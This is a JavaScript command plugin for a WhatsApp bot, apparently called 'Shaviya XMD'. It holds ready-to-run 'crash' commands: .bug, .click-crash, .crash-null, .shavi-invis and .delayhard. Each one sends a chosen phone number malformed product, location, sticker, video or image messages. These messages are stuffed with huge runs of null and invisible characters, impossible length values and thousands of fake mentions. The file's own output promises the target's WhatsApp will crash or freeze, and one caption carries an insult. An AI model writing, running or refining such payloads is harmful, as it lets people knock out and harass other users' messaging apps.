const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== STYLISH SUCCESS MESSAGE ====================
function successMessage(command, target) {
    return `╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ᴅᴇʟɪᴠᴇʀᴇᴅ ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ ᴛᴀʀɢᴇᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴡɪʟʟ ᴄʀᴀꜱʜ/ꜰʀᴇᴇᴢᴇ ᴡɪᴛʜɪɴ ᴍɪɴᴜᴛᴇꜱ ｠
╰━━━━━━━━━━━━━━━━━⬣`;
}

// ==================== .bug – exactly 150 messages ====================
async function sendProduct(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg", fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217", caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080, width: 1080, mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage, productId: "449756950375071",
                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                        description: "MY Bad" + "\u2060".repeat(60000),
                        priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                        url: "wa.me/status", productImageCount: 9999999, firstImageId: "9999999999",
                        salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                    }, businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function sendLocation(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: "p".repeat(50000), degreesLongitude: "p".repeat(50000),
                    caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                    sequenceNumber: "0", jpegThumbnail: ""
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function sendSticker(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
            fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
            fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
            mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
            mimetype: "image/webp", fileLength: "9999999999999999999", isAnimated: false,
            contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function exact150Messages(conn, target) {
    for (let i = 0; i < 50; i++) {
        await sendProduct(conn, target);
        await sendLocation(conn, target);
        await sendSticker(conn, target);
    }
}

// ==================== .click-crash – vidxnull (video crash) ====================
async function vidxnull(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "85W9wy9btWoxbdVu4cAiyhnxdwlsbtCQ2WaYdTo9w6w=",
            fileLength: "2726852",
            seconds: 27,
            mediaKey: "WJy9ZdiTPAIdcOhRfn0Oe2CIN4RnE0b1RSs8Skw/n18=",
            height: 850,
            width: 474,
            fileEncSha256: "ZH92J7p2igl823VuiawCBerbEKSU6dfFIGaWZVESY0Q=",
            directPath: "/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1779710503",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAwQFAgEGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD5lN6QJxAuCH3Q7XN7v2EzU6LaatNV0E+porTFhze4FiqS8ammhZ1lDfMAD//EACQQAAIDAAIBAwUBAAAAAAAAAAECAAMREiEEEyBREBQiQUJh/9oACAEBAAE/APbgmD4mCYBN0E8RACfoIFJiBTU+nuVUVFx2T1+ofFrDjQQIKUW0kdqstVb0DIuZDXxE+2C9hoU1fybkJcxVSEiCwEBnOGLQpX5hUiXWcUIEexswiUPzdQzYBFVSOjLCM2Wn1CB/s8qzm80zwLXD8SSRH8hG/sZPUr3to/FnJ5DIGAaJYiEMGHZ793//xAAYEQADAQEAAAAAAAAAAAAAAAAAASARMf/aAAgBAgEBPwCNNFC4OP/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAEDAQE/AOwmmLH/2Q==",
            contextInfo: {
                remoteJid: target,
                participant: target,
                pairedMediaType: "NOT_PAIRED_MEDIA",
                mentionedJid: ["0@s.whatsapp.net"],
                isForwarded: true,
                forwardingScore: 999
            },
            streamingSidecar: "Fbq08cW8Z3EtkssmVrSRbvHg9NckSmztjeAfBhUlUlX5cqKVrjsYTDH5n8lUiuZNfKEVA2o0mcOS/yE7jXc9PlpisykEOJEBvpPZNaDqS7UuXsMFd5vbFGXGruZI3D56URTtRluhBuaGIb9EEaiL1wHSkEyHeCXlZUaJx2B34PFSe195yioszf5/cJuHSlzz1Tzsm9ozh7MeggirwZvFh9UbIfhfyunyHuhnqBjukrniXdw7W+Br05SE6gSlD/8nOqrs5+v4RP1QK3A1H6L33AIbxeIJBuYmx0DAatKDloz1CqdmvLmQ0kteLg5nKjE3NBczMUqh0EhdulFvu65lBnzmJAuhzsB78u5e3LRa/dgItdlZI1euErnNB9f684SZaO15XuYrPQpB8LwPwug6H2sZHY8ehYlqnqFPIf7d5r6tkXhTiTwSOVm3dOMzVBvouwPuKqUvnEpTJyCiwGObM6I2KaQhX9tH8KpE8VrQj1v9AOheqrK9Whag0GcMwxT+TNacTh2cCX2XCRJPTcTf4jjQbDqyAMtWZrWCpnIK7N96FPV2",
            caption: "🚮⃟-𝗧𝗿𝗮𝘀𝗵-𝗩𝗮𝘂𝗹𝘁𝗦𝘂𝗽𝗲𝗿𝗶𝗼𝗿 > \"go fuck yourself\"" + "ꦽ".repeat(1111),
        }
    }, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
}

// ==================== .crash-null – NullLenght (malformed image) ====================
async function nullLenght(conn, target, mention = false) {
    const LxP = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
            fileLength: 388944,
            height: 1600,
            width: 1200,
            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1776937541",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
            contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
            },
            caption: " 丫ЦКɪПΛ - t.me/FunctionBug ",
            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
            scanLengths: [
                2899999999999999077,
                1799999999999998555,
                7699999999999999148,
                1069999999999999164
            ],
            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
        }
    };
    let msg = generateWAMessageFromContent(target, LxP, {});
    await conn.relayMessage(target, msg.message, { participant: { jid: target } });
    if (mention) {
        // optional mention – not needed for crash, but kept for compatibility
        await conn.relayMessage(target, {
            protocolMessage: {
                key: msg.key,
                type: 25
            }
        }, {});
    }
}

// ==================== COMMANDS ====================
cmd({
    pattern: "bug",
    desc: "💀 150 messages (product + location + sticker) – force close",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *SHAVIYA XMD BUG CRASH* → ${target}\n_Sending 150 payloads..._`);
    try {
        await exact150Messages(conn, target);
        await reply(successMessage(".bug", target));
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "click-crash",
    desc: "🎥 Video crash (vidxnull) – malformed video message",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "click-crash");
    if (!target) return;
    await reply(`🎥 *CLICK CRASH (VIDEO)* → ${target}\n_Sending malformed video message..._`);
    try {
        await vidxnull(conn, target);
        await reply(successMessage(".click-crash", target));
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "crash-null",
    desc: "🖼️ Image crash (NullLenght) – malformed image with huge scans",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "crash-null");
    if (!target) return;
    await reply(`🖼️ *NULL LENGTH CRASH* → ${target}\n_Sending malformed image message..._`);
    try {
        await nullLenght(conn, target, false);
        await reply(successMessage(".crash-null", target));
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== OLD COMMANDS (kept for compatibility) ====================
async function invisibleCrash(conn, target) {
    const invisibleText = '\u2060'.repeat(500000) + '\u2063'.repeat(500000);
    const msg = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 }, hasMediaAttachment: true },
            body: { text: invisibleText },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(1000000) },
            contextInfo: { mentionedJid: Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

async function delayHardCrash(conn, target) {
    const mentionedList = [ "13135550002@s.whatsapp.net", ...Array.from({ length: 5000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ];
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: "image/webp", directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: { low: 999, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true,
                    contextInfo: { participant: target, mentionedJid: mentionedList },
                    stickerSentTs: { low: -1939477883, high: 555, unsigned: false }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

cmd({
    pattern: "shavi-invis",
    desc: "🔮 INVISIBLE CRASH – No visible text, silent freeze",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *SHAVIYA XMD INVISIBLE CRASH* → ${target}`);
    try {
        await invisibleCrash(conn, target);
        await reply(successMessage(".shavi-invis", target));
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "delayhard",
    desc: "💀 EXTREME DELAY CRASH – Sticker + massive mentions",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "delayhard");
    if (!target) return;
    await reply(`💀 *DELAY HARD CRASH* → ${target}\n_Sending sticker bomb..._`);
    try {
        await delayHardCrash(conn, target);
        await reply(successMessage(".delayhard", target));
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "bugmenu",
    desc: "Show all crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*
*│ 📌 .bug          – 💀 150 messages (product+location+sticker)*
*│ 📌 .click-crash  – 🎥 Malformed video crash*
*│ 📌 .crash-null   – 🖼️ Malformed image crash*
*│ 📌 .shavi-invis  – 🔮 Invisible crash (no text)*
*│ 📌 .delayhard    – 💀 Sticker bomb (extreme delay)*
*╰──────────────●●►*
> 💡 *Examples:* 
> .bug 94712345678
> .click-crash 94712345678
> .crash-null 94712345678
> ⚠️ *Use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
